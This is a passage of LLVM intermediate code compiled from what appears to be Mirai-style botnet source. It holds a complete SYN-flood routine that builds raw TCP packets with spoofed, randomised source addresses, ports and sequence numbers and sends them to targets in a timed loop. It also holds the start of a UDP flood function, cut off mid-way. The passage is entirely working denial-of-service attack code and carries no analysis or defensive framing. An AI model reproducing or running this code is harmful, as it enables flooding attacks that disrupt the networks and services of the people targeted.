  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 19, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %12, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %5
  br label %451

; <label>:107:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %108 = load i32, i32* %12, align 4
  %109 = bitcast i32* %11 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

; <label>:112:                                    ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = call i32 @close(i32 %113)
  br label %451

; <label>:115:                                    ; preds = %107
  store i32 0, i32* %11, align 4
  br label %116

; <label>:116:                                    ; preds = %293, %115
  %117 = load i32, i32* %11, align 4
  %118 = load i8, i8* %7, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  br i1 %120, label %121, label %296

; <label>:121:                                    ; preds = %116
  %122 = call noalias i8* @calloc(i64 128, i64 1) #6
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %30, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.tcphdr*
  store %struct.tcphdr* %135, %struct.tcphdr** %31, align 8
  %136 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i64 1
  %138 = bitcast %struct.tcphdr* %137 to i8*
  store i8* %138, i8** %32, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, 15
  %143 = or i8 %142, 64
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, -16
  %148 = or i8 %147, 5
  store i8 %148, i8* %145, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = call zeroext i16 @htons(i16 zeroext 60) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %121
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %164, %121
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 6, i8* %170, align 1
  %171 = load i32, i32* %28, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 1
  %179 = load i32, i32* %178, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load i16, i16* %18, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  store i16 %183, i16* %185, align 4
  %186 = load i16, i16* %19, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 1
  store i16 %187, i16* %189, align 2
  %190 = load i32, i32* %20, align 4
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = zext i16 %192 to i32
  %194 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 2
  store i32 %193, i32* %195, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = and i16 %198, -241
  %200 = or i16 %199, 160
  store i16 %200, i16* %197, align 4
  %201 = load i8, i8* %22, align 1
  %202 = sext i8 %201 to i16
  %203 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = and i16 %202, 1
  %207 = shl i16 %206, 13
  %208 = and i16 %205, -8193
  %209 = or i16 %208, %207
  store i16 %209, i16* %204, align 4
  %210 = load i8, i8* %23, align 1
  %211 = sext i8 %210 to i16
  %212 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %211, 1
  %216 = shl i16 %215, 12
  %217 = and i16 %214, -4097
  %218 = or i16 %217, %216
  store i16 %218, i16* %213, align 4
  %219 = load i8, i8* %24, align 1
  %220 = sext i8 %219 to i16
  %221 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %220, 1
  %225 = shl i16 %224, 11
  %226 = and i16 %223, -2049
  %227 = or i16 %226, %225
  store i16 %227, i16* %222, align 4
  %228 = load i8, i8* %25, align 1
  %229 = sext i8 %228 to i16
  %230 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %229, 1
  %234 = shl i16 %233, 10
  %235 = and i16 %232, -1025
  %236 = or i16 %235, %234
  store i16 %236, i16* %231, align 4
  %237 = load i8, i8* %26, align 1
  %238 = sext i8 %237 to i16
  %239 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %238, 1
  %243 = shl i16 %242, 9
  %244 = and i16 %241, -513
  %245 = or i16 %244, %243
  store i16 %245, i16* %240, align 4
  %246 = load i8, i8* %27, align 1
  %247 = sext i8 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %247, 1
  %252 = shl i16 %251, 8
  %253 = and i16 %250, -257
  %254 = or i16 %253, %252
  store i16 %254, i16* %249, align 4
  %255 = load i8*, i8** %32, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %32, align 8
  store i8 2, i8* %255, align 1
  %257 = load i8*, i8** %32, align 8
  %258 = getelementptr inbounds i8, i8* %257, i32 1
  store i8* %258, i8** %32, align 8
  store i8 4, i8* %257, align 1
  %259 = call i32 @rand_next()
  %260 = and i32 %259, 15
  %261 = add i32 1400, %260
  %262 = trunc i32 %261 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load i8*, i8** %32, align 8
  %265 = bitcast i8* %264 to i16*
  store i16 %263, i16* %265, align 2
  %266 = load i8*, i8** %32, align 8
  %267 = getelementptr inbounds i8, i8* %266, i64 2
  store i8* %267, i8** %32, align 8
  %268 = load i8*, i8** %32, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %32, align 8
  store i8 4, i8* %268, align 1
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %32, align 8
  store i8 2, i8* %270, align 1
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %32, align 8
  store i8 8, i8* %272, align 1
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %32, align 8
  store i8 10, i8* %274, align 1
  %276 = call i32 @rand_next()
  %277 = load i8*, i8** %32, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 %276, i32* %278, align 4
  %279 = load i8*, i8** %32, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 0, i32* %282, align 4
  %283 = load i8*, i8** %32, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %32, align 8
  %285 = load i8*, i8** %32, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %32, align 8
  store i8 1, i8* %285, align 1
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %32, align 8
  store i8 3, i8* %287, align 1
  %289 = load i8*, i8** %32, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %32, align 8
  store i8 3, i8* %289, align 1
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %32, align 8
  store i8 6, i8* %291, align 1
  br label %293

; <label>:293:                                    ; preds = %168
  %294 = load i32, i32* %11, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %11, align 4
  br label %116

; <label>:296:                                    ; preds = %116
  br label %297

; <label>:297:                                    ; preds = %450, %296
  store i32 0, i32* %11, align 4
  br label %298

; <label>:298:                                    ; preds = %441, %297
  %299 = load i32, i32* %11, align 4
  %300 = load i8, i8* %7, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %299, %301
  br i1 %302, label %303, label %444

; <label>:303:                                    ; preds = %298
  %304 = load i8**, i8*** %13, align 8
  %305 = load i32, i32* %11, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8*, i8** %304, i64 %306
  %308 = load i8*, i8** %307, align 8
  store i8* %308, i8** %33, align 8
  %309 = load i8*, i8** %33, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %34, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %35, align 8
  %314 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %315 = load i32, i32* %11, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i64 %316
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i32 0, i32 2
  %319 = load i8, i8* %318, align 4
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %320, 32
  br i1 %321, label %322, label %343

; <label>:322:                                    ; preds = %303
  %323 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 1
  %328 = load i32, i32* %327, align 4
  %329 = call i32 @ntohl(i32 %328) #7
  %330 = call i32 @rand_next()
  %331 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %332 = load i32, i32* %11, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 2
  %336 = load i8, i8* %335, align 4
  %337 = zext i8 %336 to i32
  %338 = lshr i32 %330, %337
  %339 = add i32 %329, %338
  %340 = call i32 @htonl(i32 %339) #7
  %341 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 9
  store i32 %340, i32* %342, align 4
  br label %343

; <label>:343:                                    ; preds = %322, %303
  %344 = load i32, i32* %28, align 4
  %345 = icmp eq i32 %344, -1
  br i1 %345, label %346, label %350

; <label>:346:                                    ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 8
  store i32 %347, i32* %349, align 4
  br label %350

; <label>:350:                                    ; preds = %346, %343
  %351 = load i16, i16* %15, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  br label %360

; <label>:360:                                    ; preds = %354, %350
  %361 = load i16, i16* %18, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  br i1 %363, label %364, label %370

; <label>:364:                                    ; preds = %360
  %365 = call i32 @rand_next()
  %366 = and i32 %365, 65535
  %367 = trunc i32 %366 to i16
  %368 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %369 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %368, i32 0, i32 0
  store i16 %367, i16* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %364, %360
  %371 = load i16, i16* %19, align 2
  %372 = zext i16 %371 to i32
  %373 = icmp eq i32 %372, 65535
  br i1 %373, label %374, label %380

; <label>:374:                                    ; preds = %370
  %375 = call i32 @rand_next()
  %376 = and i32 %375, 65535
  %377 = trunc i32 %376 to i16
  %378 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 1
  store i16 %377, i16* %379, align 2
  br label %380

; <label>:380:                                    ; preds = %374, %370
  %381 = load i32, i32* %20, align 4
  %382 = icmp eq i32 %381, 65535
  br i1 %382, label %383, label %387

; <label>:383:                                    ; preds = %380
  %384 = call i32 @rand_next()
  %385 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 2
  store i32 %384, i32* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %383, %380
  %388 = load i32, i32* %21, align 4
  %389 = icmp eq i32 %388, 65535
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %387
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %390, %387
  %395 = load i8, i8* %22, align 1
  %396 = icmp ne i8 %395, 0
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %394
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  br label %403

; <label>:403:                                    ; preds = %397, %394
  %404 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 6
  store i16 0, i16* %412, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %415 = bitcast %struct.tcphdr* %414 to i8*
  %416 = call zeroext i16 @htons(i16 zeroext 40) #7
  %417 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %416, i32 40)
  %418 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 6
  store i16 %417, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 1
  %422 = load i16, i16* %421, align 2
  %423 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i32 0, i32 0
  %428 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %427, i32 0, i32 1
  store i16 %422, i16* %428, align 2
  %429 = load i32, i32* %12, align 4
  %430 = load i8*, i8** %33, align 8
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %429, i8* %430, i64 60, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

; <label>:441:                                    ; preds = %403
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %298

; <label>:444:                                    ; preds = %298
  %445 = call i64 @time(i64* null) #6
  %446 = load i32, i32* %29, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

; <label>:449:                                    ; preds = %444
  br label %451

; <label>:450:                                    ; preds = %444
  br label %297

; <label>:451:                                    ; preds = %449, %112, %106
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
